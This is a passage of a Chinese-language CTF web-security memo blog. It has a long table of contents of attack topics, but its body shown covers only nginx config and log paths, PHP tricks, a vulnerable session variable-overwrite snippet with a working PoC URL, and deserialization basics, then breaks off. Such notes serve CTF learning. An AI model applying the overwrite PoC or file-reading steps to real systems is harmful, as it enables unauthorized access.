<!DOCTYPE html>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
        <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
    <title>
        
            持续更新中的CTF备忘录(持续更新)
        
    </title>
    <link rel="icon" href="/img/favicon.png">
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="/css/font-awesome.min.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <link rel="stylesheet" href="/css/hljs.min.css">
    <script src="/js/hljs.min.js"></script>  
    <script src="/js/gitment.browser.js"></script>  
</head>
<body>
    <header class="header" id="header">
    <h1>
        <a class="title" href="/">
            Hpdoger
        </a>
    </h1>
    <h2>
        <a class="motto">
            Finance behind Passion in Security
        </a>
    </h2>
    <nav class="navbar">
        <ul class="menu">
            
            
                <li class="menu-item">
                    <a href="/" class="menu-item-link">
                        Home
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/archives/" class="menu-item-link">
                        Archives
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/about/" class="menu-item-link">
                        About
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/friends/" class="menu-item-link">
                        Friends
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
                        Github
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/atom.xml" class="menu-item-link">
                        RSS
                    </a>
                </li>
            
                
            
                
                
        </ul>
    </nav>
</header>
    <main class="main">
        <article class="post">
            <h1>
                <a class="title" href="/2025/01/04/My CTF Memo(持续更新)/"> 
                    持续更新中的CTF备忘录(持续更新) 
                </a>
            </h1>
            <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2025-01-04   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
            </div>
<div class="toc">
  <ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#My-CTF-Memo-持续更新"><span class="toc-list-text">My CTF Memo(持续更新)</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#各种配置文件位置"><span class="toc-list-text">各种配置文件位置</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#nginx配置文件"><span class="toc-list-text">nginx配置文件</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#nginx日志"><span class="toc-list-text">nginx日志</span></a></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#PHP知识"><span class="toc-list-text">PHP知识</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#异或"><span class="toc-list-text">异或</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#变量命名"><span class="toc-list-text">变量命名</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#变量覆盖"><span class="toc-list-text">变量覆盖</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#代码审计"><span class="toc-list-text">代码审计</span></a></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#反序列化"><span class="toc-list-text">反序列化</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#常识"><span class="toc-list-text">常识</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#代码审计骚操作"><span class="toc-list-text">代码审计骚操作</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#属性值逃逸"><span class="toc-list-text">属性值逃逸</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#常见魔法函数"><span class="toc-list-text">常见魔法函数</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#phar通用"><span class="toc-list-text">phar通用</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#Python反序列化"><span class="toc-list-text">Python反序列化</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#调用pickle"><span class="toc-list-text">调用pickle</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#flask低版本session反序列化"><span class="toc-list-text">flask低版本session反序列化</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#numpy"><span class="toc-list-text">numpy</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#相关链接"><span class="toc-list-text">相关链接</span></a></li></ol></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#XSS"><span class="toc-list-text">XSS</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#常识-1"><span class="toc-list-text">常识</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#各种xss标签-属性-poc"><span class="toc-list-text">各种xss标签/属性-poc</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#dom结构"><span class="toc-list-text">dom结构</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#编码"><span class="toc-list-text">编码</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-4"><a class="toc-list-link" href="#unicode"><span class="toc-list-text">unicode</span></a></li><li class="toc-list-item toc-list-level-4"><a class="toc-list-link" href="#html编码"><span class="toc-list-text">html编码</span></a></li><li class="toc-list-item toc-list-level-4"><a class="toc-list-link" href="#utf8-utf16-utf32"><span class="toc-list-text">utf8/utf16/utf32</span></a></li></ol></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#svg-amp-style"><span class="toc-list-text">svg&amp;style</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-4"><a class="toc-list-link" href="#mXSS-突变XSS基础标签"><span class="toc-list-text">mXSS(突变XSS基础标签)</span></a></li></ol></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#innerHTML"><span class="toc-list-text">innerHTML</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#DOMPurify"><span class="toc-list-text">DOMPurify</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#DOM-Clobbering-Attack"><span class="toc-list-text">DOM Clobbering Attack</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#各种标签"><span class="toc-list-text">各种标签</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#js创建标签"><span class="toc-list-text">js创建标签</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#a标签"><span class="toc-list-text">a标签</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#frameset标签"><span class="toc-list-text">frameset标签</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#各种协议"><span class="toc-list-text">各种协议</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#data"><span class="toc-list-text">data</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#XSS平台"><span class="toc-list-text">XSS平台</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#打页面源码"><span class="toc-list-text">打页面源码</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#当前页面"><span class="toc-list-text">当前页面</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#其他页面"><span class="toc-list-text">其他页面</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#打cookie"><span class="toc-list-text">打cookie</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#iframe"><span class="toc-list-text">iframe</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#window-location"><span class="toc-list-text">window.location</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#image"><span class="toc-list-text">image</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#XHR请求"><span class="toc-list-text">XHR请求</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#CSP相关"><span class="toc-list-text">CSP相关</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#查询csp缺陷"><span class="toc-list-text">查询csp缺陷</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#window-location-1"><span class="toc-list-text">window.location</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#csp限制目录bypass"><span class="toc-list-text">csp限制目录bypass</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#iframe来bypassCSP"><span class="toc-list-text">iframe来bypassCSP</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#Access-control-allow-origin"><span class="toc-list-text">Access-control-allow-origin</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#XSS绕过"><span class="toc-list-text">XSS绕过</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#unicode-1"><span class="toc-list-text">unicode</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#浏览器解析"><span class="toc-list-text">浏览器解析</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-4"><a class="toc-list-link" href="#域名中的点号"><span class="toc-list-text">域名中的点号</span></a></li><li class="toc-list-item toc-list-level-4"><a class="toc-list-link" href="#突破双引号限制"><span class="toc-list-text">突破双引号限制</span></a></li></ol></li></ol></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#SSRF"><span class="toc-list-text">SSRF</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#常见题型"><span class="toc-list-text">常见题型</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#gopher打mysql"><span class="toc-list-text">gopher打mysql</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#过滤指定字符串"><span class="toc-list-text">过滤指定字符串</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#常见绕过"><span class="toc-list-text">常见绕过</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#host白名单"><span class="toc-list-text">host白名单</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#指定后缀名绕过-仅限于curl产生的ssrf"><span class="toc-list-text">指定后缀名绕过(仅限于curl产生的ssrf)</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#IP地址转换绕过"><span class="toc-list-text">IP地址转换绕过</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#常规的思路"><span class="toc-list-text">常规的思路</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#骚姿势"><span class="toc-list-text">骚姿势</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#check内网ip段绕过"><span class="toc-list-text">check内网ip段绕过</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#file协议妙用"><span class="toc-list-text">file协议妙用</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#arp表"><span class="toc-list-text">arp表</span></a></li></ol></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#SQL注入"><span class="toc-list-text">SQL注入</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#文档"><span class="toc-list-text">文档</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#基本语句"><span class="toc-list-text">基本语句</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#盲注语句"><span class="toc-list-text">盲注语句</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#脚本"><span class="toc-list-text">脚本</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#布尔盲注"><span class="toc-list-text">布尔盲注</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#时间盲注"><span class="toc-list-text">时间盲注</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#报错注入"><span class="toc-list-text">报错注入</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#堆叠注入-经典union被过滤"><span class="toc-list-text">堆叠注入(经典union被过滤)</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#不用select查询字段值"><span class="toc-list-text">不用select查询字段值</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-4"><a class="toc-list-link" href="#mysql的预查询"><span class="toc-list-text">mysql的预查询</span></a></li><li class="toc-list-item toc-list-level-4"><a class="toc-list-link" href="#使用handler"><span class="toc-list-text">使用handler</span></a></li></ol></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#当set被过滤"><span class="toc-list-text">当set被过滤</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#其他函数"><span class="toc-list-text">其他函数</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#Bypass"><span class="toc-list-text">Bypass</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#过滤了”in”或者”or”"><span class="toc-list-text">过滤了”in”或者”or”</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#GETSHELL"><span class="toc-list-text">GETSHELL</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#phpmyadmin日志getshell"><span class="toc-list-text">phpmyadmin日志getshell</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#GETSHELL总结"><span class="toc-list-text">GETSHELL总结</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#MYSQL5-7以后的一些特性"><span class="toc-list-text">MYSQL5.7以后的一些特性</span></a></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#XXE利用"><span class="toc-list-text">XXE利用</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#外部实体常用poc"><span class="toc-list-text">外部实体常用poc</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#参数实体常用poc"><span class="toc-list-text">参数实体常用poc</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#参数实体调用的错误示范"><span class="toc-list-text">参数实体调用的错误示范</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#引入外部dtd文件-amp-OOB-读取本地文件"><span class="toc-list-text">引入外部dtd文件&amp;OOB-读取本地文件</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#引入外部dtd文件-amp-报错回显-读取本地文件"><span class="toc-list-text">引入外部dtd文件&amp;报错回显-读取本地文件</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#无需引入外部dtd文件-三层嵌套文件读取"><span class="toc-list-text">无需引入外部dtd文件-三层嵌套文件读取</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#利用本地xxe来bypass协议不回显的情况"><span class="toc-list-text">利用本地xxe来bypass协议不回显的情况</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#dtd-1"><span class="toc-list-text">dtd-1</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#javaweb-的本地xxe"><span class="toc-list-text">javaweb 的本地xxe</span></a></li></ol></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#文件包含"><span class="toc-list-text">文件包含</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#骚姿势-1"><span class="toc-list-text">骚姿势</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#proc"><span class="toc-list-text">/proc</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#dev-文件读写io"><span class="toc-list-text">/dev-文件读写io</span></a></li></ol></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#文件上传"><span class="toc-list-text">文件上传</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#大致思路"><span class="toc-list-text">大致思路</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#妙用-htaccess"><span class="toc-list-text">妙用.htaccess</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#妙用-user-ini"><span class="toc-list-text">妙用.user.ini</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#php-写文件"><span class="toc-list-text">php/.写文件</span></a></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#模版注入"><span class="toc-list-text">模版注入</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#Python-Jinja2引擎"><span class="toc-list-text">Python-Jinja2引擎</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#SSTI存在-amp-不存在"><span class="toc-list-text">SSTI存在&amp;不存在</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#常见攻击流程"><span class="toc-list-text">常见攻击流程</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#执行多行Python语句"><span class="toc-list-text">执行多行Python语句</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#寻找可RCE的类"><span class="toc-list-text">寻找可RCE的类</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#过滤bypass"><span class="toc-list-text">过滤bypass</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#相关链接-1"><span class="toc-list-text">相关链接</span></a></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#文件包含-1"><span class="toc-list-text">文件包含</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#php伪协议"><span class="toc-list-text">php伪协议</span></a></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#命令执行类"><span class="toc-list-text">命令执行类</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#常识-2"><span class="toc-list-text">常识</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#命令执行Bypass"><span class="toc-list-text">命令执行Bypass</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#base64编码"><span class="toc-list-text">base64编码</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#过滤关键字"><span class="toc-list-text">过滤关键字</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#双引号-amp-分号–复杂变量"><span class="toc-list-text">双引号&amp;分号–复杂变量</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#单参数过滤-用http头传参绕过"><span class="toc-list-text">单参数过滤-用http头传参绕过</span></a></li></ol></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#hash长度拓展"><span class="toc-list-text">hash长度拓展</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#Javascript原型链污染"><span class="toc-list-text">Javascript原型链污染</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#骚操作-preventExtensions绕过"><span class="toc-list-text">骚操作-preventExtensions绕过</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#Javascript原型链知识"><span class="toc-list-text">Javascript原型链知识</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#constructor-构造函数"><span class="toc-list-text">constructor-构造函数</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#prototype-原型"><span class="toc-list-text">prototype-原型</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#proto"><span class="toc-list-text">proto</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#污染思路"><span class="toc-list-text">污染思路</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#loadsh库-lt-4-17-5的污染"><span class="toc-list-text">loadsh库&lt;4.17.5的污染</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#JQuery-extend"><span class="toc-list-text">JQuery-$.extend()</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#ejs和jade的RCE"><span class="toc-list-text">ejs和jade的RCE</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#不需要原型链污染的ejs-rce"><span class="toc-list-text">不需要原型链污染的ejs-rce</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#express框架"><span class="toc-list-text">express框架</span></a></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#Javaweb"><span class="toc-list-text">Javaweb</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#反弹SHELL"><span class="toc-list-text">反弹SHELL</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#fastjson攻击"><span class="toc-list-text">fastjson攻击</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#攻击的两种方式"><span class="toc-list-text">攻击的两种方式</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#挖洞利用"><span class="toc-list-text">挖洞利用</span></a></li></ol></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#NodeJS相关"><span class="toc-list-text">NodeJS相关</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#快速启动express框架"><span class="toc-list-text">快速启动express框架</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#npm所有第三方库漏洞"><span class="toc-list-text">npm所有第三方库漏洞</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#基本语法"><span class="toc-list-text">基本语法</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#占位符"><span class="toc-list-text">占位符</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#url-parse绕过"><span class="toc-list-text">url_parse绕过</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#查看依赖的漏洞"><span class="toc-list-text">查看依赖的漏洞</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#RCE语句"><span class="toc-list-text">RCE语句</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#nodemon-node的debug模式"><span class="toc-list-text">nodemon-node的debug模式</span></a></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#综合题型"><span class="toc-list-text">综合题型</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#http请求走私"><span class="toc-list-text">http请求走私</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#jwt攻击"><span class="toc-list-text">jwt攻击</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#python-rce"><span class="toc-list-text">python-rce</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#MYSQL读取客户端文件"><span class="toc-list-text">MYSQL读取客户端文件</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#进程文件proc"><span class="toc-list-text">进程文件proc</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#常见的进程文件"><span class="toc-list-text">常见的进程文件</span></a></li></ol></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#常见的过滤bypass"><span class="toc-list-text">常见的过滤bypass</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#php一句话"><span class="toc-list-text">php一句话</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#绕过尖括号"><span class="toc-list-text">绕过尖括号</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#绕过问号限制"><span class="toc-list-text">绕过问号限制</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#绕过php标签限制"><span class="toc-list-text">绕过php标签限制</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#动态执行函数"><span class="toc-list-text">动态执行函数</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#代码执行"><span class="toc-list-text">代码执行</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#异或getshell"><span class="toc-list-text">异或getshell</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#取反getshell"><span class="toc-list-text">取反getshell</span></a></li></ol></li></ol></li></ol>
</div>
            <div class="content">
                <h1 id="My-CTF-Memo-持续更新"><a href="#My-CTF-Memo-持续更新" class="headerlink" title="My CTF Memo(持续更新)"></a>My CTF Memo(持续更新)</h1><p>自己比赛过程中使用的笔记，一些基础的知识点整理，如果自己还有机会打比赛会陆续push到这篇文章中</p>
<h1 id="各种配置文件位置"><a href="#各种配置文件位置" class="headerlink" title="各种配置文件位置"></a>各种配置文件位置</h1><h2 id="nginx配置文件"><a href="#nginx配置文件" class="headerlink" title="nginx配置文件"></a>nginx配置文件</h2><p>常用于查看路由转发，可能把flag藏到哪个路径</p>
<pre><code>/usr/local/nginx/conf/nginx.conf
/etc/nginx/nginx.conf</code></pre><h2 id="nginx日志"><a href="#nginx日志" class="headerlink" title="nginx日志"></a>nginx日志</h2><pre><code>/var/log/nginx/access.log;
/var/log/nginx/error.log</code></pre><h1 id="PHP知识"><a href="#PHP知识" class="headerlink" title="PHP知识"></a>PHP知识</h1><h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><p>两个字节可以异或出来不同的字母，然后字符串的异或也是按位进行的，每个字节和对应的字节进行异或然后拼接</p>
<p><img src="http://static.zybuluo.com/1160307775/83s1wac85uhpalqusrqvv2lf/image_1dl3pck7o1600130m19djirkkbd1p.png" alt="image_1dl3pck7o1600130m19djirkkbd1p.png-81.7kB"></p>
<h2 id="变量命名"><a href="#变量命名" class="headerlink" title="变量命名"></a>变量命名</h2><p>php命名变量支持使用大括号包裹，但是仍然要使用$符号<br><img src="http://static.zybuluo.com/1160307775/l9b1p48gsdxb98yafs1syn1y/image_1dnc6tbnmb3u18e4r7320b155e9.png" alt="image_1dnc6tbnmb3u18e4r7320b155e9.png-58.9kB"></p>
<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>通常造成漏洞点就是extract，和$符号的使用。典型的SESSION覆盖例子如下</p>
<pre><code>&lt;?php
    session_start();

    foreach (array_keys($_REQUEST) as $v) {
        $key = $v;
        $$key = $_REQUEST[$v];
    }</code></pre><p>poc:<code>index.php?_SESSION[admin]=true</code></p>
<p>在php中，无论cookie/session/get/post都是一个数组，通过hpp传入一个数组(‘admin’=&gt;true)，覆盖各种值。</p>
<p>上面的poc，在变量覆盖的层面表达如下：</p>
<pre><code>$_SESSION = array(&#39;admin&#39;=&gt;&#39;true&#39;);</code></pre><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>对于一些PHP文件，可以用P神最近的项目来审:<a href="https://phpchip.com/" target="_blank" rel="noopener">https://phpchip.com/</a></p>
<p>挖掘动态PHP代码中存在的安全隐患，而且包含了很多函数，对于小型CTF的代码的自动审计来说够用了。</p>
<p><img src="http://static.zybuluo.com/1160307775/hbq2u24im63am63sj6k6r3pv/image_1dsgmve7218qm1j5mbchsl03a99.png" alt="image_1dsgmve7218qm1j5mbchsl03a99.png-37.8kB"></p>
<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h2 id="常识"><a href="#常识" class="headerlink" title="常识"></a>常识</h2><ul>
<li>在反序列化的时候，不会执行__construct里的值</li>
<li>原类中无法控制的private/protected变量，可以自己用构造方法序列化进去</li>
<li>php允许动态调用函数，函数名可以是字符串<br><img src="http://static.zybuluo.com/1160307775/dlevq47gan2c6hcjiaip5pxp/image_1di9sfr2g6gpga81h0t12mod9i9.png" alt="image_1di9sfr2g6gpga81h0t12mod9i9.png-61.4kB"></li>
</ul>
<p>如果要在类内动态调用函数，则需要用大括号包裹<br><img src="http://static.zybuluo.com/1160307775/mtwa9vsmcizlna828gu6ns89/image_1di9sjrriems2t1djm40b67d3m.png" alt="image_1di9sjrriems2t1djm40b67d3m.png-154.3kB"></p>
<ul>
<li>找到反序列化的入口很关键</li>
